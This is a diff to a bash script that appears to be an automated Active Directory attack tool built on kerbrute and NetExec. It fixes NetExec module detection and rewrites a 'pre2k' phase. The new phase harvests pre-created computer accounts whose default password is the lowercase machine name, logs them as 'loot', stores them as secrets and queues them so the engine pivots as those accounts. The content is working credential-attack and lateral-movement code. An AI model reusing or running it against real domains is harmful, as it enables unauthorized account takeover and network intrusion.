@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.49.2"
+readonly VERSION="1.49.3"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 KERBRUTE_RC4_DEAD=0               # set when the DC rejects RC4 (KDC_ERR_ETYPE_NOSUPP) → kerbrute unusable, spray via netexec
@@ -230,8 +230,16 @@ script_dir() { cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd; }
 external_tool() { local p; p="$(script_dir)/external/$1"; [[ -e "$p" ]] && printf '%s\n' "$p"; }
 nxc_has_module() {  # nxc_has_module <proto> <module>
     local proto="$1" mod="$2" cache="${OUTDIR:-/tmp}/.nxc_${proto}_modules.txt"
-    [[ -s "$cache" ]] || $NXC "$proto" -L >"$cache" 2>/dev/null || true
-    grep -qE "^[[:space:]]*\\[\\*\\][[:space:]]+${mod}[[:space:]]" "$cache" 2>/dev/null
+    if [[ ! -s "$cache" ]]; then
+        # nxc prints the module list to stdout AND/OR stderr depending on version/tty,
+        # so capture BOTH; only persist a NON-empty result so a transient failure
+        # doesn't poison the cache (the old `2>/dev/null` dropped the list entirely →
+        # every nxc_has_module returned false → e.g. the pre2k path never fired).
+        local out; out=$($NXC "$proto" -L 2>&1)
+        [[ -n "$out" ]] && printf '%s\n' "$out" >"$cache"
+    fi
+    # strip ANSI, then match the module name as a standalone word.
+    sed 's/\x1b\[[0-9;]*m//g' "$cache" 2>/dev/null | grep -qiE "(^|[[:space:]])${mod}([[:space:]]|\$)"
 }
 
 SUDO_PASS="${SUDO_PASS:-}"   # optional: enables fully unattended sudo (-S)
@@ -1337,14 +1345,26 @@ phase_precreated_computers() {
         local pre="$OUTDIR/precreated_computers_nxc.txt"
         run "$NXC ldap $DCT ${args[*]} -M pre2k"
         $NXC ldap "$DCT" "${args[@]}" -M pre2k 2>&1 | tee -a "$LOGFILE" | tee "$pre"
-        if grep -qiE 'TGT|ccache|password|sAMAccountName|pre-created|pre2k' "$pre"; then
-            loot "Pre-created computer account results → precreated_computers_nxc.txt"
-            grep -oiP '(?:Account|User|sAMAccountName)\s*[:=]\s*\K\S+\$?' "$pre" 2>/dev/null | sort -u |
-            while IFS= read -r acc; do
-                [[ -z "$acc" || "$acc" != *\$ ]] && continue
-                note_cred_source "$acc" "NetExec pre2k module"
-            done
-        fi
+        local stem queued=0
+        # CONFIRMED: pre2k prints "Successfully obtained TGT for <name>@domain" when the
+        # default password (lowercase computer name) worked → QUEUE that cred so the
+        # engine actually pivots as the computer account (the old code only noted it).
+        while IFS= read -r stem; do
+            [[ -z "$stem" ]] && continue
+            loot "★ Pre-created computer (pre2k): ${C_BOLD}${stem}\$${C_RESET} password is ${C_GREEN}${stem}${C_RESET}"
+            add_secret "$stem" "pre2k default password (${stem}\$)"
+            note_cred_source "${stem}\$" "NetExec pre2k module"
+            queue_cred "${stem}\$" "$stem" "" "Pre-created computer (pre2k)"; queued=1
+        done < <(grep -oiP 'obtained TGT for \K[^@[:space:]]+' "$pre" 2>/dev/null | sed 's/\$$//' | sort -u)
+        # Also queue any account pre2k merely LISTED (default password = lowercase name)
+        # so it's tried even if the module couldn't mint the TGT (e.g. RC4-disabled DC).
+        while IFS= read -r acc; do
+            [[ -z "$acc" || "$acc" != *\$ ]] && continue
+            stem="${acc%\$}"
+            note_cred_source "$acc" "NetExec pre2k module"
+            queue_cred "$acc" "${stem,,}" "" "Pre-created computer (pre2k, default pw)"; queued=1
+        done < <(grep -oiP 'Pre-created computer account:\s*\K\S+\$' "$pre" 2>/dev/null | sort -u)
+        [[ "$queued" == "1" ]] && loot "Pre-created computer accounts queued → precreated_computers_nxc.txt"
         return
     fi
 
